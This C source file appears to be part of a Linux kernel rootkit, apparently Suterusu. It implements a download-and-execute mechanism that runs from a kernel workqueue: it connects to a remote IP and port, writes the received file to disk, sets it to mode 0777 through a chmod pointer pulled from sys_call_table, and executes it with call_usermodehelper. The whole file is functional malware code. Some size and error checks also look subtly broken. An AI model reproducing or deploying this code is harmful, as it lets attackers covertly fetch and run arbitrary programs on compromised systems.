#include "common.h"

#include <linux/socket.h>
#include <net/tcp.h>
#include <net/inet_common.h>
#include <linux/inet.h>
#include <linux/crc32.h>
#include <linux/workqueue.h>

asmlinkage long (*sys_chmod)(const char __user *filename, umode_t mode);

struct workqueue_struct *work_queue;

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20)
    #define SUTERUSU_INIT_WORK(_t, _f) INIT_WORK((_t), (void (*)(void *))(_f), (_t))
#else
    #define SUTERUSU_INIT_WORK(_t, _f) INIT_WORK((_t), (_f))
#endif

struct dlexec_task {
    struct work_struct work;
    char *path;
    unsigned int ip;
    unsigned short port;
    unsigned int retry;
    unsigned int delay;
};

int recv_msg ( struct socket *sock, char *buf, unsigned int max )
{
    int len;
    struct msghdr msg;
    struct iovec iov;
    mm_segment_t old_fs;

    iov.iov_base = buf;
    iov.iov_len = max;

    msg.msg_name = 0;
    msg.msg_namelen = 0;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = 0;

    old_fs = get_fs();
    set_fs(get_ds());

    len = sock_recvmsg(sock, &msg, max, 0);

    set_fs(old_fs);

    return len;
}

unsigned int get_uint ( struct socket *sock )
{
    unsigned char buf[4];

    if ( recv_msg(sock, buf, 4) == 4 )
    {
        unsigned int ret = 0;

        ret |= buf[0];
        ret |= buf[1] << 8;
        ret |= buf[2] << 16;
        ret |= buf[3] << 24;

        return ret;
    }
    else
        return -1;
}

// IP and port are assumed network byte order (big endian)
unsigned int download_file ( char *path, unsigned int ip, unsigned short port )
{
    struct file *filep;
    int bytes_read, bytes_written;
    unsigned int size, crc32_target, crc32_calc = 0;
    char *buf;
    struct sockaddr_in saddr;
    struct socket *sock = NULL;
    mm_segment_t old_fs;

    if ( ! (filep = filp_open(path, O_CREAT|O_WRONLY|O_TRUNC, S_IRWXU|S_IRWXG|S_IRWXO)) )
        return 1;

    buf = kmalloc(4096, GFP_KERNEL);
    if ( ! buf )
    {
        #if __DEBUG__
        printk("Error allocating memory for download\n");
        #endif

        filp_close(filep, NULL);
        return 1;
    }

    if ( sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock) < 0 )
    {
        #if __DEBUG__
        printk("Error creating socket\n");
        #endif

        filp_close(filep, NULL);
        kfree(buf);
        return 1;
    }

    memset(&saddr, 0, sizeof(saddr));
    saddr.sin_family = AF_INET;
    saddr.sin_port = port;
    saddr.sin_addr.s_addr = ip;

    if ( inet_stream_connect(sock, (struct sockaddr *)&saddr, sizeof(saddr), 0) < 0 )
    {
        #if __DEBUG__
        printk("Error connecting socket to address\n");
        #endif

        filp_close(filep, NULL);
        kfree(buf);
        return 1;
    }

    if ( (size = get_uint(sock)) < 0 )
    {
        #if __DEBUG__
        printk("Error getting size from socket\n");
        #endif

        filp_close(filep, NULL);
        kfree(buf);
        return 1;
    }

    while ( 1 )
    {
        if ( size > sizeof(buf) )
            bytes_read = recv_msg(sock, buf, sizeof(buf));
        else
            bytes_read = recv_msg(sock, buf, size);

        if ( bytes_read <= 0 )
            break;

        size -= bytes_read;

        while ( bytes_read > 0 )
        {
            old_fs = get_fs();
            set_fs(get_ds());

            if ( (bytes_written = filep->f_op->write(filep, buf, bytes_read, &filep->f_pos)) <= 0 )
            {
                #if __DEBUG__
                printk("Error writing to file\n");
                #endif

                set_fs(old_fs);
                filp_close(filep, NULL);
                kfree(buf);
                return 1;
            }

            set_fs(old_fs);

            crc32_calc = crc32_le(crc32_calc, buf, bytes_written);

            bytes_read -= bytes_written;
        }

        if ( size == 0 )
            break;
    }

    if ( (crc32_target = get_uint(sock)) < 0 )
    {
        #if __DEBUG__
        printk("Error getting crc32 from socket\n");
        #endif

        filp_close(filep, NULL);
        kfree(buf);
        return 1;
    }

    inet_release(sock);

    filp_close(filep, NULL);

    if ( crc32_target != crc32_calc )
    {
        #if __DEBUG__
        printk("crc32 mismatch, possible data corruption, target=%x, calc=%x\n", crc32_target, crc32_calc);
        #endif

        kfree(buf);
        return 1;
    }

    kfree(buf);
    return 0;
}

// IP and port are assumed network byte order (big endian)
void dl_exec ( char *path, unsigned int ip, unsigned short port, unsigned int retry, unsigned int delay )
{
    unsigned int attempt = 1;
    mm_segment_t old_fs;
    char *argv[] = { path, NULL };
    #if defined(_CONFIG_X86_) || defined(_CONFIG_X86_64_)
    char *envp[] = { "PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin", NULL };
    #else // ARM
    char *envp[] = { "PATH=/sbin:/system/sbin:/system/bin:/system/xbin", NULL };
    #endif

    while ( download_file(path, ip, port) )
    {
        #if __DEBUG__
            #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 36)
        printk("Attempt #%u: Error downloading file from %u.%u.%u.%u:%hu, sleeping for %ums\n", attempt, NIPQUAD(ip), ntohs(port), delay);
            #else
        printk("Attempt #%u: Error downloading file from %pI4:%hu, sleeping for %ums\n", attempt, &ip, ntohs(port), delay);
            #endif
        #endif

        if ( attempt++ == retry + 1 )
            return;

        msleep(delay);
    }

    #if __DEBUG__
    printk("File successfully downloaded, now executing\n");
    #endif

    old_fs = get_fs();
    set_fs(get_ds());

    // Stupid umasks...
    sys_chmod(path, 0777);

    set_fs(old_fs);

    call_usermodehelper(path, argv, envp, 0);
}

void dlexecer ( struct work_struct *work )
{
    struct dlexec_task *task = (struct dlexec_task *)work;

    #if __DEBUG__
        #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 36)
    printk("dlexecer worker spawned, downloading and executing file, path=%s, ip=%u.%u.%u.%u, port=%hu, retry=%u, delay=%u\n", task->path, NIPQUAD(task->ip), ntohs(task->port), task->retry, task->delay);
        #else
    printk("dlexecer worker spawned, downloading and executing file, path=%s, ip=%pI4, port=%hu, retry=%u, delay=%u\n", task->path, &task->ip, ntohs(task->port), task->retry, task->delay);
        #endif
    #endif

    dl_exec(task->path, task->ip, task->port, task->retry, task->delay);

    kfree(task);
}

int dlexec_queue( char *path, unsigned int ip, unsigned short port, unsigned int retry, unsigned int delay )
{
    struct dlexec_task *task;

    task = kmalloc(sizeof(*task), GFP_KERNEL);
    if ( ! task )
        return -1;

    SUTERUSU_INIT_WORK(&task->work, &dlexecer);

    task->path = kstrdup(path, GFP_KERNEL);
    task->ip = ip;
    task->port = port;
    task->retry = retry;
    task->delay = delay;

    return queue_work(work_queue, &task->work);
}

void dlexec_init ( void )
{
    #if __DEBUG__
    printk("Initializing download & exec work queue\n");
    #endif

    sys_chmod = (void *)sys_call_table[__NR_chmod];
    work_queue = create_workqueue("dlexec");
}

void dlexec_exit ( void )
{
    #if __DEBUG__
    printk("Destroying download & exec work queue\n");
    #endif

    flush_workqueue(work_queue);
    destroy_workqueue(work_queue);
}
